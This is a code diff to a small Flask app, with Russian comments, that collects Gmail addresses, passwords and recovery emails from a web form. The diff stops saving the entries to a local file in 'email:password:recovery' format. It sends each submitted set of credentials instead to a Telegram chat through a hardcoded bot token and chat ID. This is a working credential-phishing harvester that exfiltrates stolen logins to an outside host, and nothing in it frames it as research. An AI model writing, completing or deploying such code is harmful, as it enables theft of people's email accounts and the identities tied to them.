@@ -1,10 +1,14 @@
 import os
 from flask import Flask, render_template, request
+from telegram import Bot
 
 app = Flask(__name__)
 
-# Путь к файлу для хранения данных
-data_file = "user_data.txt"
+# Токен твоего Telegram-бота, который ты получил от BotFather
+TOKEN = "7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54"
+CHAT_ID = "1361079299"  # Это твой chat_id для избранных сообщений
+
+bot = Bot(token=TOKEN)
 
 @app.route("/", methods=["GET", "POST"])
 def form():
@@ -13,10 +17,11 @@ def form():
         password = request.form.get("password")
         recovery_email = request.form.get("recovery_email")
 
-        # Запись данных в файл
-        with open(data_file, "a") as file:
-            # Форматирование строки без пробелов и с двоеточиями
-            file.write(f"{gmail}:{password}:{recovery_email}\n")
+        # Формируем сообщение для отправки в "Избранное"
+        message = f"Your Gmail account: {gmail}\nPassword: {password}\nRecovery email: {recovery_email}"
+
+        # Отправка сообщения в "Избранное" (Saved Messages)
+        bot.send_message(chat_id=CHAT_ID, text=message)
 
         # Отображение страницы с успешной отправкой данных
         return render_template("success.html", gmail=gmail, recovery_email=recovery_email)
